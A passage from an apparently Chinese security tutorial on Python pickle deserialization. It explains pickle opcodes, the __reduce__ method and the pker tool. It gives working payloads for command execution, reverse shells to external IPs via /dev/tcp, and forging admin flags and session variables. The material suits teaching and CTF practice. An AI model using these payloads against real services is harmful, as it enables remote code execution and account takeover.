b&#x27;\x93&#x27;  # same as GLOBAL but using names on the stacks</span><br><span class="line">MEMOIZE          = b&#x27;\x94&#x27;  # store top of the stack in memo</span><br><span class="line">FRAME            = b&#x27;\x95&#x27;  # indicate the beginning of a new frame</span><br><span class="line"></span><br><span class="line"># Protocol 5</span><br><span class="line"></span><br><span class="line">BYTEARRAY8       = b&#x27;\x96&#x27;  # push bytearray</span><br><span class="line">NEXT_BUFFER      = b&#x27;\x97&#x27;  # push next out-of-band buffer</span><br><span class="line">READONLY_BUFFER  = b&#x27;\x98&#x27;  # make top of stack readonly</span><br></pre></td></tr></table></figure><blockquote><p>S : 后面跟的是字符串<br>( ：作为命令执行到哪里的一个标记<br>t ：将从 t 到标记的全部元素组合成一个元祖，然后放入栈中<br>c ：定义模块名和类名（模块名和类名之间使用回车分隔）<br>R ：从栈中取出可调用函数以及元祖形式的参数来执行，并把结果放回栈中<br>. ：点号是结束符</p></blockquote><p>例：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">opcode=cos</span><br><span class="line">system</span><br><span class="line">(S&#x27;/bin/sh&#x27;</span><br><span class="line">tR.</span><br></pre></td></tr></table></figure><blockquote><p>第一行的c 后面是模块名 换行之后是类名 于是就将os.system放入栈中</p><p>然后的( 是标记符 我们将一个标记放入栈中</p><p>S的后面是字符串 放入栈中</p><p>t将栈中标记之前的内容取出来转化成元组 再存入栈中（’&#x2F;bin&#x2F;sh’,）随后 标记消失</p><p>然后 R将元组取出 并将callable取出 将元组作为callable的参数 并执行 对应这里就是os.system(‘&#x2F;bin&#x2F;sh’) 然后再将结果存入栈中</p></blockquote><h2 id="简单pickle反序列化漏洞"><a href="#简单pickle反序列化漏洞" class="headerlink" title="简单pickle反序列化漏洞"></a>简单pickle反序列化漏洞</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.age=<span class="number">18</span></span><br><span class="line">        self.name=<span class="string">&quot;Pickle&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        command=<span class="string">r&quot;whoami&quot;</span></span><br><span class="line">        <span class="keyword">return</span> (os.system,(command,))</span><br><span class="line"> </span><br><span class="line">p=Person()</span><br><span class="line">opcode=pickle.dumps(p)</span><br><span class="line"><span class="built_in">print</span>(opcode)</span><br><span class="line"> </span><br><span class="line">P=pickle.loads(opcode)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;The age is:&#x27;</span>+<span class="built_in">str</span>(P.age),<span class="string">&#x27;The name is:&#x27;</span>+P.name)</span><br></pre></td></tr></table></figure><p>Person类中加入了<code>__reduce__</code>函数，该函数能够定义该类的二进制字节流被反序列化时进行的操作。返回值是一个<code>(callable, ([para1,para2...])[,...])</code>类型的元组。当字节流被反序列化时，Python就会执行<code>callable(para1,para2...)</code>函数。因此当上述的Person对象被<code>unpickling</code>时，就会执行<code>os.system(command)</code></p><p><code>__reduce__()</code> 其实是 <code>object</code>类中的一个魔术方法，<strong>它会在反序列化过程开始时被调用</strong>，我们可以通过重写<code>object.__reduce__()</code> 函数，使之在被实例化时按照重写的方式进行。</p><p>Python 要求该方法返回一个字符串或者元组。如果返回元组<code>(callable, ([para1,para2...])[,...])</code> ，那么每当该类的对象被反序列化时，该 callable 就会被调用，参数为<code>para1</code>、<code>para2</code> … 后面再详细解释</p><h3 id="python的魔术方法"><a href="#python的魔术方法" class="headerlink" title="python的魔术方法"></a>python的魔术方法</h3><p>由此 可以看下python的魔术方法</p><p>和php类似,python魔术方法也会在一些特定情况下被自动调用.我们尤其要注意的是<code>__reduce__</code>魔术方法,这会在反序列化过程开始时被调用,所以我们可以序列化一个<code>__reduce__</code>魔术方法中有系统命令的实例并且让服务器将它反序列化,从而达到任意命令执行的效果.</p><p>除此之外还有很多魔术方法.例如初始化函数<code>__init__</code>和构造函数<code>__new__</code>.和php类似,python中也有魔法属性.例如<code>__doc__</code>,<code>__name__</code>,<code>__class__</code>,<code>__base__</code>等.</p><p><code>pickle.loads()</code>会在反序列化一个实例时自动引入没有引入的库.</p><blockquote><p><strong>构造方法<code>__new__</code></strong></p><ul><li>在实例化一个类时自动被调用,是类的构造方法.</li><li>可以通过重写<code>__new__</code>自定义类的实例化过程</li></ul><p><strong>初始化方法<code>__init__</code></strong></p><ul><li>在<code>__new__</code>方法之后被调用,主要负责定义类的属性,以初始化实例</li></ul><p>析构方法<code>__del__</code></p><ul><li>在实例将被销毁时调用</li><li>只在实例的所有调用结束后才会被调用</li></ul><p><code>__getattr__</code></p><ul><li>获取不存在的对象属性时被触发</li><li>存在返回值</li></ul><p><code>__setattr__</code></p><ul><li>设置对象成员值的时候触发</li><li>传入一个self,一个要设置的属性名称,一个属性的值</li></ul><p><code>__repr__</code></p><ul><li>在实例被传入<code>repr()</code>时被调用</li><li>必须返回字符串</li></ul><p><code>__call__</code></p><ul><li>把对象当作函数调用时触发</li></ul><p><code>__len__</code></p><ul><li>被传入<code>len()</code>时调用</li><li>返回一个整型</li></ul><p><code>__str__</code></p><ul><li>被<code>str()</code>,<code>format()</code>,<code>print()</code>调用时调用,返回一个字符串</li></ul></blockquote><p>在未增加<code>__reduce__</code>时，我们的序列化内容是一串基于上面提到的操作码的 bytes，我们可以利用 pickletools 将这里的 opcode 转化成我们更易读的形式</p><p><strong>pickletools是python的一个内建模块,常用的方法有<code>pickletools.dis()</code>,用于把一段opcode转换为易读的形式,</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> opcode</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"></span><br><span class="line">opcode = <span class="string">b&#x27;\x80\x03c__main__\nPerson\nq\x00)\x81q\x01&#125;q\x02(X\x03\x00\x00\x00ageq\x03K\x12X\x04\x00\x00\x00nameq\x04X\x06\x00\x00\x00Pickleq\x05ub.&#x27;</span></span><br><span class="line">pickletools.dis(opcode)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0: \x80 PROTO      3</span></span><br><span class="line"><span class="string">    2: c    GLOBAL     &#x27;__main__ Person&#x27;</span></span><br><span class="line"><span class="string">   19: q    BINPUT     0</span></span><br><span class="line"><span class="string">   21: )    EMPTY_TUPLE</span></span><br><span class="line"><span class="string">   22: \x81 NEWOBJ</span></span><br><span class="line"><span class="string">   23: q    BINPUT     1</span></span><br><span class="line"><span class="string">   25: &#125;    EMPTY_DICT</span></span><br><span class="line"><span class="string">   26: q    BINPUT     2</span></span><br><span class="line"><span class="string">   28: (    MARK</span></span><br><span class="line"><span class="string">   29: X        BINUNICODE &#x27;age&#x27;</span></span><br><span class="line"><span class="string">   37: q        BINPUT     3</span></span><br><span class="line"><span class="string">   39: K        BININT1    18</span></span><br><span class="line"><span class="string">   41: X        BINUNICODE &#x27;name&#x27;</span></span><br><span class="line"><span class="string">   50: q        BINPUT     4</span></span><br><span class="line"><span class="string">   52: X        BINUNICODE &#x27;Pickle&#x27;</span></span><br><span class="line"><span class="string">   63: q        BINPUT     5</span></span><br><span class="line"><span class="string">   65: u        SETITEMS   (MARK at 28)</span></span><br><span class="line"><span class="string">   66: b    BUILD</span></span><br><span class="line"><span class="string">   67: .    STOP</span></span><br><span class="line"><span class="string">highest protocol among opcodes = 2</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="Pker"><a href="#Pker" class="headerlink" title="Pker"></a>Pker</h3><p>这是一个可以遍历Python AST的形式 来自动化解析 pickle opcode的工具</p><p><a href="https://github.com/EddieIvan01/pker">https://github.com/EddieIvan01/pker</a> 也可以使用这个工具来生成，在后续部分操作码被限制的时候某些情况下还是很好用的</p><h4 id="Pker可以做到什么"><a href="#Pker可以做到什么" class="headerlink" title="Pker可以做到什么"></a>Pker可以做到什么</h4><ul><li>变量赋值：存到memo中，保存memo下标和变量名即可</li><li>函数调用</li><li>类型字面量构造</li><li>list和dict成员修改</li><li>对象成员变量修改</li></ul><h4 id="使用方法与实例"><a href="#使用方法与实例" class="headerlink" title="使用方法与实例"></a>使用方法与实例</h4><p>pker最主要的有三个函数<code>GLOBAL()</code>、<code>INST()</code>和<code>OBJ()</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GLOBAL(&#x27;os&#x27;, &#x27;system&#x27;)             =&gt;  cos\nsystem\n</span><br><span class="line">INST(&#x27;os&#x27;, &#x27;system&#x27;, &#x27;ls&#x27;)         =&gt;  (S&#x27;ls&#x27;\nios\nsystem\n</span><br><span class="line">OBJ(GLOBAL(&#x27;os&#x27;, &#x27;system&#x27;), &#x27;ls&#x27;)  =&gt;  (cos\nsystem\nS&#x27;ls&#x27;\no</span><br></pre></td></tr></table></figure><p>return可以返回一个对象</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">return           =&gt;  .</span><br><span class="line">return var       =&gt;  g_\n.</span><br><span class="line">return 1         =&gt;  I1\n.</span><br></pre></td></tr></table></figure><p>当然你也可以和Python的正常语法结合起来，下面是使用示例</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pker_test.py</span><br><span class="line"></span><br><span class="line">i = 0</span><br><span class="line">s = &#x27;id&#x27;</span><br><span class="line">lst = [i]</span><br><span class="line">tpl = (0,)</span><br><span class="line">dct = &#123;tpl: 0&#125;</span><br><span class="line">system = GLOBAL(&#x27;os&#x27;, &#x27;system&#x27;)</span><br><span class="line">system(s)</span><br><span class="line">return</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令行下</span><br><span class="line">$ python3 pker.py &lt; pker_tests.py</span><br><span class="line"></span><br><span class="line">b&quot;I0\np0\n0S&#x27;id&#x27;\np1\n0(g0\nlp2\n0(I0\ntp3\n0(g3\nI0\ndp4\n0cos\nsystem\np5\n0g5\n(g1\ntR.&quot;</span><br></pre></td></tr></table></figure><p>自动解析并生成了我们所需的opcode。</p><h2 id="手搓opcode"><a href="#手搓opcode" class="headerlink" title="手搓opcode"></a>手搓opcode</h2><p>我们可以通过在类中重写<code>__reduce__</code>方法，从而在反序列化时执行任意命令，但是通过这种方法一次只能执行一个命令，如果想一次执行多个命令，就只能通过手写opcode的方式了</p><p>在opcode中，<code>.</code>是程序结束的标志。我们可以通过去掉<code>.</code>来将两个字节流拼接起来</p><p>在pickle中，函数执行的字节码主要有有三个：<code>R</code>、<code>i</code>、<code>o</code>，所以我们可以从三个方向构造paylaod</p><p>另外还有b操作符 也是可以构造paylaod</p><p><img src="C:\Users\admin\Desktop\20200320230711-7972c0ea-6abc-1.gif" alt="20200320230711-7972c0ea-6abc-1"></p><h3 id="R操作符"><a href="#R操作符" class="headerlink" title="R操作符"></a>R操作符</h3><p>对应函数如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def load_reduce(self):</span><br><span class="line">        stack = self.stack</span><br><span class="line">        args = stack.pop()</span><br><span class="line">        func = stack[-1]</span><br><span class="line">        stack[-1] = func(*args)</span><br></pre></td></tr></table></figure><p>弹出栈作为函数执行的参数 参数需要是元组形式 随后取栈中最后一个元素作为函数 将指向结果赋值给此元素</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">opcode1=b&#x27;&#x27;&#x27;cos</span><br><span class="line">system</span><br><span class="line">(S&#x27;whoami&#x27;</span><br><span class="line">tR.&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cos\nsystem\n</span><br></pre></td></tr></table></figure><h3 id="i操作符"><a href="#i操作符" class="headerlink" title="i操作符"></a>i操作符</h3><p>相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）</p><p><img src="https://bu.dusays.com/2024/05/13/6641a59872990.png" alt="image-20240319223011879"></p><p>读取下面两行分别为module和name 然后 利用 find_class 寻找对应的方法 pop_mark 获取参数</p><p>i操作符将寻找前面的mark来闭合 中间的数据作为元组 将其作为函数参数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(X\x06\x00\x00\x00whoamiios\nsystem\n.</span><br></pre></td></tr></table></figure><p>X向后读取四个字符串 将我们的whoami命令压入栈中 i将向后读取 模块与方法os.system 将前面的参数执行</p><p><img src="https://bu.dusays.com/2024/05/13/6641a597c125f.png" alt="image-20240319223116907"></p><p>pop_mark的代码如下</p><p>先将当前栈赋值给items 然后弹出栈内元素 随后 将这个栈赋值给当前栈 返回items</p><p><img src="https://bu.dusays.com/2024/05/13/6641a597d892a.png" alt="image-20240319223058153"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">opcode2=b&#x27;&#x27;&#x27;(S&#x27;whoami&#x27;</span><br><span class="line">ios</span><br><span class="line">system</span><br><span class="line">.&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure><h3 id="o操作符"><a href="#o操作符" class="headerlink" title="o操作符"></a>o操作符</h3><p>寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象</p><p><img src="https://bu.dusays.com/2024/05/13/6641a597d609e.png" alt="image-20240319223201321"></p><p>pop_mark我们上面看到了 就是可以弹出栈内的元素 这里的args就是 先弹出栈中的一个元素作为参数 然后 再弹出第一个元素作为函数</p><p>最后 使用instantiate函数进行自执行</p><p>可以如下构造</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b&quot;(cos\nsystem\nX\x06\x00\x00\x00whoamio.&quot;</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641a5986d936.png" alt="image-20240319223219061"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">opcode3=b&#x27;&#x27;&#x27;(cos</span><br><span class="line">system</span><br><span class="line">S&#x27;whoami&#x27;</span><br><span class="line">o.&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure><h3 id="b操作符"><a href="#b操作符" class="headerlink" title="b操作符"></a>b操作符</h3><p><img src="https://bu.dusays.com/2024/05/13/6641a59891c2f.png" alt="image-20240319223240426"></p><p>当栈中存在<code>__setstate__</code>时 会执行setstate(state) 也就是 这里我们如果自己写一个<code>__setstate__</code>类 构造os.system 和 whoami即可执行命令</p><p>s字符的源码 是将</p><p><img src="https://bu.dusays.com/2024/05/13/6641a597d904c.png" alt="image-20240319223258882"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c__main__\ntest\n)\x81&#125;X\x0c\x00\x00\x00__setstate__cos\nsystem\nsbX\x06\x00\x00\x00whoamib.</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641a598cb11a.png" alt="image-20240319223319867"></p><p>首先 搞了主函数和类 <code>__main__</code>和test 随后 插入空元组和空字典 然后写入<code>__setstate__</code> c再向后读 得到os.system 字符s将第一个元素和第二个元素作为键值对 插入到第三个元素之中<code>&#123;__main__.test:()&#125;,__setstate__,os.system</code> b字符使第一个元素出栈 也就是<code>&#123;&#39;__setstate__&#39;:os.system&#125;</code> 执行一次 setstate(state) 随后插入whoami然后弹出 执行os.system(whoami)</p><p>‍</p><p>并且<code>pickle.loads</code>会解决import 问题，对于未引入的module会自动尝试import。也就是说整个python标准库的代码执行、命令执行函数我们都可以使用。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>可以使用<code>R</code>,<code>i</code>,<code>o</code>,<code>b</code>等操作码实现命令执行</p><h4 id="法一"><a href="#法一" class="headerlink" title="法一"></a>法一</h4><p>基本的构造如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c&lt;module&gt;</span><br><span class="line">&lt;callable&gt;</span><br><span class="line">(&lt;args&gt;</span><br><span class="line">tR</span><br></pre></td></tr></table></figure><p>填充上内容也就是：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cos</span><br><span class="line">system   #引入 os 模块的 system 方法，这里实际上是一步将函数添加到 stack 的操作</span><br><span class="line">(S&#x27;ls&#x27;   # 把当前 stack 存到 metastack，清空 stack，再将 &#x27;ls&#x27; 压入 stack</span><br><span class="line">tR.     # t 也就是将 stack 中的值弹出并转为 tuple，把 metastack 还原到 stack，再将         tuple 压入 stack</span><br><span class="line">        # R 的内容就成为了 system(*(&#x27;ls&#x27;,)) ，然后 . 代表结束，返回当前栈顶元素</span><br><span class="line">&lt;=&gt; __import__(&#x27;os&#x27;).system(*(&#x27;ls&#x27;,))</span><br></pre></td></tr></table></figure><p>这样就是一个最基础的 getshell 的构造</p><p>其中 c 操作码指向的实际上是一个 <code>self.find_class(modname, name);</code> 可以在源码中找到</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">find_class</span>(<span class="params">self, module, name</span>):</span><br><span class="line">        <span class="comment"># Subclasses may override this.</span></span><br><span class="line">        <span class="keyword">if</span> self.proto &lt; <span class="number">3</span> <span class="keyword">and</span> self.fix_imports:</span><br><span class="line">            <span class="keyword">if</span> (module, name) <span class="keyword">in</span> _compat_pickle.NAME_MAPPING:</span><br><span class="line">                module, name = _compat_pickle.NAME_MAPPING[(module, name)]</span><br><span class="line">            <span class="keyword">elif</span> module <span class="keyword">in</span> _compat_pickle.IMPORT_MAPPING:</span><br><span class="line">                module = _compat_pickle.IMPORT_MAPPING[module]</span><br><span class="line">        <span class="built_in">__import__</span>(module, level=<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">if</span> self.proto &gt;= <span class="number">4</span>:</span><br><span class="line">            <span class="keyword">return</span> _getattribute(sys.modules[module], name)[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">getattr</span>(sys.modules[module], name)</span><br></pre></td></tr></table></figure><p><code>c</code>操作符把<code>find_class()</code>函数返回的一个类对象压入栈,通过<code>__import__()</code>引入了模块并且通过<code>self.proto</code>判断pickle版本处理了不同版本的函数名称问题.</p><p>使用其他操作符同理</p><p>i:  opcode&#x3D;b’’’(S’calc’ ios system .’’’</p><p>o:  opcode&#x3D;b’’’(cos system S’calc’ o.’’’</p><p><strong>注：<code>pickle.loads</code> 是可以自动 import 的，这一点为我们的攻击提供了方便</strong></p><h4 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h4><p>我们还可以重写类的 <code>object.__reduce__()</code> 函数，使之在被实例化时按照重写的方式进行，对应opcode当中的R指令</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (os.system,(<span class="string">&#x27;calc&#x27;</span>,))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(pickle.dumps(Test(), protocol=<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;cnt\nsystem\np0\n(Vcalc\np1\ntp2\nRp3\n.&#x27;</span></span><br></pre></td></tr></table></figure><p>利用 pickle 的 <code>__reduce__</code> 可以直接用它的操作模式实现我们上面手搓的 <code>__import__(&#39;os&#39;).system(*(&#39;ls&#39;,))</code> 的构造。（ 缺点：只能执行单一的函数，很难构造复杂的操作 ）</p><h4 id="法三"><a href="#法三" class="headerlink" title="法三"></a>法三</h4><p>上文也是提到过</p><p>opcode 都会以 <code>.</code> 结束，我们在程序正常的 opcode 之后去掉 <code>.</code> 再拼接上我们的内容即可命令执行</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"> </span><br><span class="line">opcode=<span class="string">b&#x27;&#x27;&#x27;cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">(S&#x27;whoami&#x27;</span></span><br><span class="line"><span class="string">tRcos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">(S&#x27;whoami&#x27;</span></span><br><span class="line"><span class="string">tR.&#x27;&#x27;&#x27;</span></span><br><span class="line">pickle.loads(opcode)</span><br><span class="line"> </span><br></pre></td></tr></table></figure><h4 id="法四"><a href="#法四" class="headerlink" title="法四"></a>法四</h4><p>配合反弹shell</p><p>payload:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">b&#x27;&#x27;&#x27;cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">(S&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.11.21/8888 0&gt;&amp;1&#x27;&quot;</span></span><br><span class="line"><span class="string">tR.</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">a=<span class="string">&#x27;&#x27;&#x27;V__setstate__</span></span><br><span class="line"><span class="string">(S&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/124.223.91.44/2333 0&gt;&amp;1&#x27;&quot;</span></span><br><span class="line"><span class="string">ios</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">.&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(a.encode()))</span><br></pre></td></tr></table></figure><h3 id="操控实例化对象的属性"><a href="#操控实例化对象的属性" class="headerlink" title="操控实例化对象的属性"></a>操控实例化对象的属性</h3><h4 id="例1"><a href="#例1" class="headerlink" title="例1"></a>例1</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,age,name</span>):</span><br><span class="line">        self.age=age</span><br><span class="line">        self.name=name</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">opcode=<span class="string">b&#x27;&#x27;&#x27;c__main__</span></span><br><span class="line"><span class="string">Person</span></span><br><span class="line"><span class="string">(I18</span></span><br><span class="line"><span class="string">S&#x27;Pickle&#x27;</span></span><br><span class="line"><span class="string">tR.&#x27;&#x27;&#x27;</span></span><br><span class="line"> </span><br><span class="line">p=pickle.loads(opcode)</span><br><span class="line"><span class="built_in">print</span>(p)</span><br><span class="line"><span class="built_in">print</span>(p.age,p.name)</span><br><span class="line"> </span><br><span class="line"><span class="comment">###</span></span><br><span class="line">&lt;__main__.Person <span class="built_in">object</span> at <span class="number">0x00000223B2E14CD0</span>&gt;//地址，会根据您运行代码的机器和 Python 解释器的不同而不同</span><br><span class="line"><span class="number">18</span> Pickle</span><br></pre></td></tr></table></figure><p>以上opcode相当于手动执行了构造函数<code>Person(18,&#39;Pickle&#39;)</code>,改变了实例化的属性</p><h4 id="例2"><a href="#例2" class="headerlink" title="例2"></a>例2</h4><p>假设有如下内容限制用户权限：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,admin,guest</span>):</span><br><span class="line">        self.admin=admin</span><br><span class="line">        self.guest=guest</span><br></pre></td></tr></table></figure><p>假设正常我们以访客登录时会传入如下 pickle 序列化内容</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.admin=<span class="literal">False</span></span><br><span class="line">        self.guest=<span class="literal">True</span></span><br><span class="line"></span><br><span class="line">u = User()</span><br><span class="line"><span class="built_in">print</span>(pickle.dumps(u))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;\x80\x03c__main__\nUser\nq\x00)\x81q\x01&#125;q\x02(X\x05\x00\x00\x00adminq\x03\x89X\x05\x00\x00\x00guestq\x04\x88ub.&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    0: \x80 PROTO      3</span></span><br><span class="line"><span class="string">    2: c    GLOBAL     &#x27;__main__ User&#x27;</span></span><br><span class="line"><span class="string">   17: q    BINPUT     0</span></span><br><span class="line"><span class="string">   19: )    EMPTY_TUPLE</span></span><br><span class="line"><span class="string">   20: \x81 NEWOBJ</span></span><br><span class="line"><span class="string">   21: q    BINPUT     1</span></span><br><span class="line"><span class="string">   23: &#125;    EMPTY_DICT</span></span><br><span class="line"><span class="string">   24: q    BINPUT     2</span></span><br><span class="line"><span class="string">   26: (    MARK</span></span><br><span class="line"><span class="string">   27: X        BINUNICODE &#x27;admin&#x27;</span></span><br><span class="line"><span class="string">   37: q        BINPUT     3</span></span><br><span class="line"><span class="string">   39: \x89     NEWFALSE</span></span><br><span class="line"><span class="string">   40: X        BINUNICODE &#x27;guest&#x27;</span></span><br><span class="line"><span class="string">   50: q        BINPUT     4</span></span><br><span class="line"><span class="string">   52: \x88     NEWTRUE</span></span><br><span class="line"><span class="string">   53: u        SETITEMS   (MARK at 26)</span></span><br><span class="line"><span class="string">   54: b    BUILD</span></span><br><span class="line"><span class="string">   55: .    STOP</span></span><br><span class="line"><span class="string">highest protocol among opcodes = 2</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>那么我们对登陆时的 <code>\x89</code> <code>\x88</code> 进行调换，</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b&#x27;\x80\x03c__main__\nUser\nq\x00)\x81q\x01&#125;q\x02(X\x05\x00\x00\x00adminq\x03\x89X\x05\x00\x00\x00guestq\x04\x88ub.&#x27;</span><br><span class="line"></span><br><span class="line">b&#x27;\x80\x03c__main__\nUser\nq\x00)\x81q\x01&#125;q\x02(X\x05\x00\x00\x00adminq\x03\x88X\x05\x00\x00\x00guestq\x04\x89ub.&#x27;</span><br></pre></td></tr></table></figure><p>即可得到如下实例化结果：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> opcode</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,admin,guest</span>):</span><br><span class="line">        self.admin=admin</span><br><span class="line">        self.guest=guest</span><br><span class="line"></span><br><span class="line">opcode = <span class="string">b&#x27;\x80\x03c__main__\nUser\nq\x00)\x81q\x01&#125;q\x02(X\x05\x00\x00\x00adminq\x03\x88X\x05\x00\x00\x00guestq\x04\x89ub.&#x27;</span></span><br><span class="line"><span class="comment">#pickletools.dis(opcode)</span></span><br><span class="line"></span><br><span class="line">fakeUser = pickle.loads(opcode)</span><br><span class="line"><span class="built_in">print</span>(fakeUser.admin,fakeUser.guest)</span><br><span class="line"></span><br><span class="line"><span class="comment"># True False</span></span><br></pre></td></tr></table></figure><p>可见将admin与guest的权限改了</p><h3 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h3><p>在session或token中，由于需要存储一些用户信息，所以我们常常能够看见pickle的身影。程序会将用户的各种信息序列化并存储在session或token中，以此来验证用户的身份。</p><p>假如session或token是以明文的方式进行存储的，我们就有可能通过变量覆盖的方式进行身份伪造。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#secret.py</span></span><br><span class="line">secret=<span class="string">&quot;This is a key&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> secret</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;secret变量的值为:&quot;</span>+secret.secret)</span><br><span class="line"> </span><br><span class="line">opcode=<span class="string">b&#x27;&#x27;&#x27;c__main__</span></span><br><span class="line"><span class="string">secret</span></span><br><span class="line"><span class="string">(S&#x27;secret&#x27;</span></span><br><span class="line"><span class="string">S&#x27;Hack!!!&#x27;</span></span><br><span class="line"><span class="string">db.&#x27;&#x27;&#x27;</span></span><br><span class="line">fake=pickle.loads(opcode)</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;secret变量的值为:&quot;</span>+fake.secret)</span><br><span class="line"> </span><br><span class="line"><span class="comment">###</span></span><br><span class="line">secret变量的值为:This <span class="keyword">is</span> a key</span><br><span class="line">secret变量的值为:Hack!!!</span><br></pre></td></tr></table></figure><p>我们首先通过<code>c</code>来获取<code>__main__.secret</code>模块，然后将字符串<code>secret</code>和<code>Hack!!!</code>压入栈中，然后通过字节码<code>d</code>将两个字符串组合成字典<code>&#123;&#39;secret&#39;:&#39;Hack!!!&#39;&#125;</code>的形式。由于在pickle中，反序列化后的数据会以key-value的形式存储，所以secret模块中的变量<code>secret=&quot;This is a 